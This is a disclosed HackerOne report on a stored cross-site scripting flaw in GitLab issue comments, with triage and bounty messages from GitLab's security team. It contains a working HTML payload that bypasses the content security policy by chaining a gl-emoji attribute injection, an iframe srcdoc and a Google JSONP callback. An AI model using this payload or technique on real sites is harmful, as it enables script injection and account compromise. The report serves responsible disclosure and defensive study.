---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
date: 2022-06-08
submitted: 2021-11-11T14:55:36.689Z
bounty_usd: 3000
votes: 38
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "jarij"
source: "https://hackerone.com/reports/1398305"
title: "Stored XSS on issue comments and other pages which contain notes"
---
# Stored XSS on issue comments and other pages which contain notes

> **Severity:** High | **Bounty:** 3,000 USD | **Votes:** 38 | **Program:** GitLab | **Disclosed:** 2022-06-08

- Report: [https://hackerone.com/reports/1398305](https://hackerone.com/reports/1398305)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-11-11T14:55:36.689Z

## Timeline

- **Report Filed**
- **2021-11-12** @jarij: Here's the CSP bypass. To reproduce this issue on gitlab.com:

* Create new private project
* Create new issue
* Copy and paste the following payload into the comment field:

```
<pre data-sourcepos="&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34><iframe srcdoc=&#34;<script src=https://apis.google.com/complete/search?client=chrome&amp;q=alert(document.domain);//&amp;callback=setTimeout></script>&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

{F1511542}
- **Report Severity Updated**
- **Report Severity Updated**
- **Changed Scope**
- **2021-11-14** @nmalcolm_gitlab: Hello jarij,

Thank you for submitting this report!

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/345657.  This issue will be made public 30 days following the release of a patch.

We typically award a partial bounty at the time of triage, as per our [H1 Policy](https://hackerone.com/gitlab). I am holding off on awarding a bounty at this time as I wait on the engineering team to indicate whether this is a duplicate issue or not. I'll get back to you as soon as I know more!

We will also continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Nick Malcolm
GitLab Security Team
- **2021-11-15** @nmalcolm_gitlab: Hello again,

I've verified that this is not a duplicate. Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Nick Malcolm
GitLab Security Team
- **Bounty Awarded**
- **Report Triaged**
- **2021-11-16** @jarij: Thanks!
- **2021-11-17** @gitlab-securitybot: ETA for fix:

Hi @jarij,

The issue you reported is currently scheduled to be fixed by 2021-12-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-01-05** @gitlab-securitybot: ETA for fix:

Hi @jarij,

The issue you reported is currently scheduled to be fixed by 2022-01-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2022-05-25** @jarij: Can we disclose this? @nmalcolm_gitlab
- **Agreed On Going Public**
- **Report Became Public**
